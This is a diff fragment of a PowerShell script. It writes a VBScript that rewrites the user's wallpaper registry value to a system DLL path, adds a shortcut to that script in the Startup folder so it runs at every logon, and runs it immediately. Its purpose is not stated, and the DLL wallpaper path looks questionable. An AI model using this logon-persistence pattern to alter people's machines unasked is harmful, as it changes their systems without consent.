@@ -46,12 +46,24 @@ foreach ($user in $users) {
 
 # Create VBScript file
 $vbsScript = @"
+Set objShell = CreateObject("WScript.Shell")
 objShell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", "C:\Windows\System32\imageres.dll", "REG_SZ"
-    objShell.Run "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True"
+objShell.Run "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True
 "@
 
-$vbsFilePath = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup\script.vbs")
-Set-Content -Path $vbsFilePath -Value $vbsScript
+$vbsFilePath = [System.IO.Path]::Combine($desktopPath, "script.vbs")
+$vbsScript | Out-File -FilePath $vbsFilePath -Encoding ASCII
+
+# Create a shortcut to the VBScript file in the startup folder
+$startupFolderPath = [Environment]::GetFolderPath("Startup")
+$shortcutPath = [System.IO.Path]::Combine($startupFolderPath, "script.lnk")
+$WshShell = New-Object -ComObject WScript.Shell
+$shortcut = $WshShell.CreateShortcut($shortcutPath)
+$shortcut.TargetPath = $vbsFilePath
+$shortcut.Save()
+
+# Run the VBScript file
+$WshShell.Run($vbsFilePath)
 
 $source = @"
 using System;
